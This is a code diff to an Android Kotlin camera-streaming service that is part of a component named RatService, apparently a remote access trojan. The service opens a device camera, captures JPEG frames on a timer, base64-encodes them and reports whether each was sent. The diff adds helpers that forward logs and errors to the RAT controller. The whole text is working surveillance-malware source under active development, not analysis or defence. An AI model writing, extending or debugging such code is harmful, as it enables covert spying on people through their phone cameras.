@@ -40,23 +40,30 @@ class CameraStreamService : Service() {
     private var running = false
     private var frameCount = 0
 
+    private fun slog(msg: String) {
+        Log.i(TAG, msg)
+        RatService.instance?.sendLog(TAG, msg)
+    }
+    private fun elog(msg: String) {
+        Log.e(TAG, msg)
+        RatService.instance?.sendLog(TAG, "ERR: $msg")
+    }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val front = intent?.getBooleanExtra("front", false) ?: false
         val interval = intent?.getLongExtra("interval", 150L) ?: 150L
 
-        Log.i(TAG, "onStartCommand front=$front")
+        slog("onStartCommand front=$front interval=$interval")
 
-        // Cek permission — kalau belum granted, STOP tanpa buka kamera (nggak spam popup)
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED) {
-            Log.e(TAG, "❌ CAMERA PERMISSION NOT GRANTED")
+            elog("CAMERA PERMISSION NOT GRANTED — abort")
             stopSelf()
             return START_NOT_STICKY
         }
 
-        // Kalau udah streaming, stop dulu
         if (isStreaming) {
-            Log.i(TAG, "Already streaming — restart")
+            slog("Already streaming — restart")
             stopSelf()
             return START_NOT_STICKY
         }
@@ -97,12 +104,12 @@ class CameraStreamService : Service() {
             val cameraId = cm.cameraIdList.firstOrNull { id ->
                 cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
             } ?: cm.cameraIdList.firstOrNull() ?: run {
-                Log.e(TAG, "❌ No camera")
+                elog("No camera available")
                 stopSelf()
                 return
             }
 
-            Log.i(TAG, "✅ Using cameraId=$cameraId")
+            slog("Using cameraId=$cameraId")
 
             thread = HandlerThread("cam_stream").also { it.start() }
             handler = Handler(thread!!.looper)
@@ -114,7 +121,7 @@ class CameraStreamService : Service() {
                 ?.maxByOrNull { it.width * it.height }
                 ?: Size(480, 360)
 
-            Log.i(TAG, "Frame size ${size.width}x${size.height}")
+            slog("Frame size ${size.width}x${size.height}")
 
             imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
 
@@ -134,10 +141,10 @@ class CameraStreamService : Service() {
                         ) ?: false
 
                         if (frameCount % 20 == 0) {
-                            Log.i(TAG, "Frame #$frameCount sent=$sent size=${b64.length}")
+                            slog("Frame #$frameCount sent=$sent size=${b64.length}")
                         }
                     } catch (e: Exception) {
-                        Log.e(TAG, "Encode error", e)
+                        elog("Encode error: ${e.message}")
                     } finally {
                         try { image.close() } catch (_: Exception) {}
                     }
@@ -146,49 +153,56 @@ class CameraStreamService : Service() {
 
             cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
-                    Log.i(TAG, "✅ Camera opened")
+                    slog("Camera opened")
                     cameraDevice = camera
                     startCaptureLoop()
                 }
                 override fun onDisconnected(camera: CameraDevice) {
+                    slog("Camera disconnected")
                     camera.close()
                     stopSelf()
                 }
                 override fun onError(camera: CameraDevice, error: Int) {
-                    Log.e(TAG, "❌ Camera error: $error")
+                    elog("Camera error code=$error")
                     camera.close()
                     stopSelf()
                 }
             }, handler)
 
         } catch (e: Exception) {
-            Log.e(TAG, "startStreaming error", e)
+            elog("startStreaming exception: ${e.message}")
             stopSelf()
         }
     }
 
     private fun startCaptureLoop() {
         try {
-            val camera = cameraDevice ?: return
-            val reader = imageReader ?: return
+            val camera = cameraDevice ?: run {
+                elog("cameraDevice null in startCaptureLoop")
+                return
+            }
+            val reader = imageReader ?: run {
+                elog("imageReader null in startCaptureLoop")
+                return
+            }
             @Suppress("DEPRECATION")
             camera.createCaptureSession(
                 listOf(reader.surface),
                 object : CameraCaptureSession.StateCallback() {
                     override fun onConfigured(s: CameraCaptureSession) {
-                        Log.i(TAG, "✅ Session configured")
+                        slog("Session configured")
                         session = s
                         loopCapture()
                     }
                     override fun onConfigureFailed(s: CameraCaptureSession) {
-                        Log.e(TAG, "❌ Config failed")
+                        elog("Session config failed")
                         stopSelf()
                     }
                 },
                 handler
             )
         } catch (e: Exception) {
-            Log.e(TAG, "startCaptureLoop error", e)
+            elog("startCaptureLoop exception: ${e.message}")
         }
     }
 
@@ -206,12 +220,12 @@ class CameraStreamService : Service() {
             s.capture(req.build(), null, handler)
             handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
         } catch (e: Exception) {
-            Log.e(TAG, "loopCapture error", e)
+            elog("loopCapture exception: ${e.message}")
         }
     }
 
     override fun onDestroy() {
-        Log.i(TAG, "onDestroy — frames=$frameCount")
+        slog("onDestroy — frames=$frameCount")
         running = false
         isStreaming = false
         try { session?.close() } catch (_: Exception) {}
